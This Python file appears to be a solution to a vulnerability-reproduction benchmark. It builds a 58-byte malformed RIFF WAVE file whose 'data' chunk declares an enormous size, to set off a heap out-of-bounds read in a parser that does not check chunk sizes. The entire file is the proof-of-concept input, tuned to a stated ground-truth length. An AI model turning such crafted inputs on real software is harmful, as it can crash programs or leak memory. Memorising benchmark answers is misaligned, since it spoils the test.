import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in a RIFF file parser.
        It occurs when a chunk's declared size is not validated against the
        remaining file size, leading to an out-of-bounds read.

        We craft a RIFF WAVE file where the 'data' chunk has a very large
        size field, but the file ends immediately after, causing the parser
        to read past the end of the buffer.

        The structure is designed to match the ground-truth PoC length of 58 bytes:
        - RIFF header (8 bytes)
        - 'WAVE' form type (4 bytes)
        - 'fmt ' chunk (24 bytes)
        - 'JUNK' chunk (14 bytes for padding)
        - 'data' chunk header with malicious size (8 bytes)
        Total: 8 + 4 + 24 + 14 + 8 = 58 bytes.
        """
        
        # RIFF header
        poc = b'RIFF'
        
        # Overall file size (total length - 8). 58 - 8 = 50.
        file_size = 50
        poc += struct.pack('<I', file_size)
        
        # Form Type
        poc += b'WAVE'
        
        # 'fmt ' chunk (Format Chunk)
        poc += b'fmt '
        fmt_chunk_size = 16
        poc += struct.pack('<I', fmt_chunk_size)
        # Standard PCM format data
        poc += b'\x01\x00\x01\x00\x80\xbb\x00\x00\x00\xee\x02\x00\x02\x00\x10\x00'

        # 'JUNK' chunk (to match the 58-byte ground-truth length)
        # 58 (total) - 44 (current len without this chunk) = 14 bytes needed.
        # 4 (id) + 4 (size) + 6 (data) = 14.
        poc += b'JUNK'
        junk_chunk_size = 6
        poc += struct.pack('<I', junk_chunk_size)
        poc += b'\x00' * junk_chunk_size
        
        # 'data' chunk (Data Chunk) - The vulnerability trigger
        poc += b'data'
        # A very large size to cause an out-of-bounds read.
        data_chunk_size = 0x7FFFFFFF
        poc += struct.pack('<I', data_chunk_size)

        return poc
